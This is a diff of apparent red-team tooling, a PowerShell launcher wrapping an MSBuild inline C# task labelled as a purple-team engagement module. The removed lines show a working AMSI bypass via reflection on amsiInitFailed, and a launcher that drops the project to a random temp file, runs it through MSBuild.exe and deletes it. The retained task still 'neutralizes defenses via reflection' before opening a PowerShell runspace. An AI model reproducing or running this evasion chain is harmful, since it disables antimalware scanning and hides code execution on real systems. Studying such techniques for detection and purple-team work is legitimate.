@@ -1,8 +1,3 @@
-$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$f = $a.GetField('amsiInitFailed','NonPublic,Static')
-$f.SetValue($null,$true)
-
-$x = @'
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Build">
     <CoreTask />
@@ -27,7 +22,6 @@ public class CoreTask : Task, ITask
         Console.WriteLine("[*] Zer0byte Corp - Engagement Module");
         Console.WriteLine("[*] Target: Purple Team\n");
         
-        // Pure C# AMSI bypass via reflection - no PowerShell needed
         Console.WriteLine("[*] Phase 1: Neutralizing defenses via reflection...");
         try
         {
@@ -55,7 +49,6 @@ public class CoreTask : Task, ITask
             Console.WriteLine("[!] Phase 1 warning: " + ex.Message);
         }
         
-        // Now PowerShell will work without AMSI scanning
         Console.WriteLine("\n[*] Phase 2: Validation tests...\n");
         
         using (Runspace rs = RunspaceFactory.CreateRunspace())
@@ -107,9 +100,3 @@ public class CoreTask : Task, ITask
     </Task>
   </UsingTask>
 </Project>
-'@
-
-$p = "$env:LOCALAPPDATA\Microsoft\Windows\$([Guid]::NewGuid().ToString().Substring(0,8)).tmp"
-$x | Out-File $p -Encoding ASCII
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe $p /v:q /nologo
-Remove-Item $p -Force
